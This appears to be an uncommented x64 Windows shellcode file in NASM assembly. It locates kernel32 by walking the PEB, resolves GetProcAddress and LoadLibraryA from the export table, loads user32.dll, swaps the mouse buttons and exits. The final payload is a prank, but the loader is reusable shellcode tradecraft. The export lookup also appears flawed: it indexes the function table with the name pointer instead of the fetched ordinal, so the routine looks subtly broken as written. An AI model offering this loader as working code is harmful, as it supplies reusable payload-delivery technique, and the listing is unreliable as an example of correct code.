BITS 64
global start

section .text
start:    
    xor rcx, rcx
    mov rax, [gs:rcx + 0x60]
    mov rax, [rax + 0x18]
    mov rsi, [rax + 0x20]
    lodsq
    xchg rsi, rax
    lodsq
    mov rbx, [rax + 0x20]

    xor r8, r8
    mov r8d, [rbx + 0x3c]
    mov rdx, r8
    add rdx, rbx
    mov r8d, [rdx + 0x88]
    add r8, rbx
    xor rsi, rsi
    mov esi, [r8 + 0x20]
    add rsi, rbx
    xor rcx, rcx
    mov r9, 0x41636f7250746547

Get_Func:

    inc rcx
    xor rax, rax
    mov eax, [rsi + rcx * 4]
    add rax, rbx
    cmp QWORD [rax], r9
    jnz Get_Func
    xor rsi, rsi
    mov esi, [r8 + 0x24]
    add rsi, rbx
    mov cx, [rsi + rcx * 2]
    xor rsi, rsi
    mov esi, [r8 + 0x1c]
    add rsi, rbx
    xor rdx, rdx
    mov edx, [rsi + rax * 4]
    add rdx, rbx
    mov rdi, rdx

    mov rcx, 0x41797261
    push rcx
    mov rcx, 0x7262694c64616f4c
    push rcx
    mov rdx, rsp
    mov rcx, rbx
    sub rsp, 0x30
    call rdi
    add rsp, 0x30
    add rsp, 0x10
    mov rsi, rax

    mov rcx, 0x6c6c
    push rcx
    mov rcx, 0x642e323372657375
    push rcx
    mov rcx, rsp
    sub rsp, 0x30
    call rsi
    add rsp, 0x30
    add rsp, 0x10
    mov r15, rax

    xor rcx, rcx
    push rcx
    mov rcx, 0x6e6f7474754265
    push rcx
    mov rcx, 0x73756f4d70617753
    push rcx
    mov rdx, rsp
    mov rcx, r15
    sub rsp, 0x28
    call rdi
    add rsp, 0x28
    add rsp, 0x18
    mov r15, rax

    mov rcx, 1
    call r15

    xor rcx, rcx
    mov rcx, 0x737365
    push rcx
    mov rcx, 0x636f725074697845
    push rcx
    mov rdx, rsp
    mov rcx, rbx
    sub rsp, 0x30
    call rdi
    add rsp, 0x30
    add rsp, 0x10
    mov r15, rax

    mov rcx, 0
    call r15
